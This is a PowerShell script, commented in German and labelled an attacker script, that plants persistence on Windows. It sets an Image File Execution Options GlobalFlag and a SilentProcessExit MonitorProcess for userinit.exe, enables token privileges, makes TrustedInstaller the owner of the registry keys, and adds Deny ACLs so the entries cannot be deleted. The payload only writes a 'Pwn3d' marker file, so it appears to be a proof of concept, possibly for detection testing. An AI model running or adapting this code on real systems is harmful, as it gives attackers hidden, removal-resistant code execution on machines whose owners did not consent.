#Requires -RunAsAdministrator
<#
.SYNOPSIS
    Attacker-Script: Setzt IFEO GlobalFlag und SilentProcessExit MonitorProcess
    für userinit.exe. Schützt die Einträge via Registry-ACL gegen Entfernung.
#>

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class TokenUtil {
    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
    static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr tok);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool LookupPrivilegeValue(string host, string name, ref long luid);
    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
    static extern bool AdjustTokenPrivileges(IntPtr tok, bool disable,
        ref LUID_AND_ATTRIBUTES newState, int len, IntPtr prev, IntPtr relen);
    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    struct LUID_AND_ATTRIBUTES { public int Count; public long Luid; public int Attr; }
    public static void Enable(string privilege) {
        IntPtr proc = System.Diagnostics.Process.GetCurrentProcess().Handle;
        IntPtr tok = IntPtr.Zero;
        OpenProcessToken(proc, 0x20 | 0x8, ref tok);
        LUID_AND_ATTRIBUTES tp; tp.Count = 1; tp.Luid = 0; tp.Attr = 2;
        LookupPrivilegeValue(null, privilege, ref tp.Luid);
        AdjustTokenPrivileges(tok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
    }
}
"@

$targetProcess = "userinit.exe"

$ifeoPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$targetProcess"
$spePath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\$targetProcess"
$ifeoParentPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"

function Set-RegistryDenyDelete {
    param ([string]$RegistryPath)

    Write-Host "[*] Verarbeite: $RegistryPath"

    if (-not (Test-Path $RegistryPath)) {
        Write-Warning "    Schlüssel existiert nicht, überspringe: $RegistryPath"
        return
    }

    $cleanPath = $RegistryPath -replace "^HKLM:\\", ""

    try {
        $key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
            $cleanPath,
            [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
            [System.Security.AccessControl.RegistryRights]::ChangePermissions
        )

        if ($null -eq $key) {
            Write-Warning "    Konnte Schlüssel nicht öffnen (keine Rechte?): $RegistryPath"
            return
        }

        $acl = $key.GetAccessControl()

        $rule = New-Object System.Security.AccessControl.RegistryAccessRule(
            "Everyone",
            ([System.Security.AccessControl.RegistryRights]::Delete -bor
             [System.Security.AccessControl.RegistryRights]::SetValue -bor
             [System.Security.AccessControl.RegistryRights]::ChangePermissions -bor
             [System.Security.AccessControl.RegistryRights]::TakeOwnership),
            [System.Security.AccessControl.InheritanceFlags]::None,
            [System.Security.AccessControl.PropagationFlags]::None,
            [System.Security.AccessControl.AccessControlType]::Deny
        )

        $acl.AddAccessRule($rule)
        $key.SetAccessControl($acl)
        $key.Close()

        Write-Host "    [+] Deny Delete/SetValue/ChangePermissions/TakeOwnership gesetzt." -ForegroundColor Green

    } catch {
        Write-Error "    Fehler bei $RegistryPath`: $_"
    }
}

function Set-RegistryOwnerTrustedInstaller {
    param ([string]$RegistryPath)

    $cleanPath = $RegistryPath -replace "^HKLM:\\", ""

    try {
        [TokenUtil]::Enable("SeRestorePrivilege")
        [TokenUtil]::Enable("SeTakeOwnershipPrivilege")

        $key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
            $cleanPath,
            [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
            [System.Security.AccessControl.RegistryRights]::TakeOwnership
        )

        if ($null -eq $key) {
            Write-Warning "    TakeOwnership fehlgeschlagen (keine Rechte?): $RegistryPath"
            return
        }

        $acl = $key.GetAccessControl([System.Security.AccessControl.AccessControlSections]::Owner)
        $trustedInstaller = New-Object System.Security.Principal.NTAccount("NT SERVICE", "TrustedInstaller")
        $acl.SetOwner($trustedInstaller)
        $key.SetAccessControl($acl)
        $key.Close()

        Write-Host "    [+] Owner auf TrustedInstaller gesetzt." -ForegroundColor Green

    } catch {
        Write-Error "    Fehler bei $RegistryPath`: $_"
    }
}


function Set-RegistryDenyDeleteSubkeys {
    param ([string]$RegistryPath)

    $cleanPath = $RegistryPath -replace "^HKLM:\\", ""
    try {
        $key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
            $cleanPath,
            [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
            [System.Security.AccessControl.RegistryRights]::ChangePermissions
        )

        if ($null -eq $key) {
            Write-Warning "    Konnte Parent nicht öffnen: $RegistryPath"
            return
        }

        $acl = $key.GetAccessControl()
        $rule = New-Object System.Security.AccessControl.RegistryAccessRule(
            "Everyone",
            ([System.Security.AccessControl.RegistryRights]::Delete -bor
            [System.Security.AccessControl.RegistryRights]::CreateSubKey),
            [System.Security.AccessControl.InheritanceFlags]::None,
            [System.Security.AccessControl.PropagationFlags]::None,
            [System.Security.AccessControl.AccessControlType]::Deny
        )
        $acl.AddAccessRule($rule)
        $key.SetAccessControl($acl)
        $key.Close()

        Write-Host "    [+] Deny DeleteSubdirectories auf Parent gesetzt." -ForegroundColor Green
    } catch {
        Write-Error "    Fehler bei $RegistryPath`: $_"
    }
}


try {
    # IFEO-Schluessel erstellen
    New-Item -Path $ifeoPath -Force

    # GlobalFlag setzen (0x200 = 512 als Dezimal)
    New-ItemProperty -Path $ifeoPath `
        -Name "GlobalFlag" `
        -Value 512 `
        -PropertyType DWORD `
        -Force

    # SilentProcessExit-Schluessel erstellen
    New-Item -Path $spePath -Force

    # MonitorProcess setzen
    New-ItemProperty -Path $spePath `
        -Name "MonitorProcess" `
        -Value "C:\Windows\System32\cmd.exe /c echo Pwn3d > C:\Users\Public\Documents\pwned.txt" `
        -PropertyType String `
        -Force

    # ReportingMode setzen - notwendig, um den MonitorProzess zu starten
    New-ItemProperty -Path $spePath `
        -Name "ReportingMode" `
        -Value 1 `
        -PropertyType DWORD `
        -Force


    # Owner zuerst setzen (muss vor Deny TakeOwnership passieren)
    Set-RegistryOwnerTrustedInstaller $ifeoPath
    Set-RegistryOwnerTrustedInstaller $spePath

    # Danach ACL sperren
    Set-RegistryDenyDelete $ifeoPath
    Set-RegistryDenyDelete $spePath
    Set-RegistryDenyDeleteSubkeys $ifeoParentPath

} catch {
    Write-Host "IFEO was not successful: $_" -ForegroundColor Yellow
}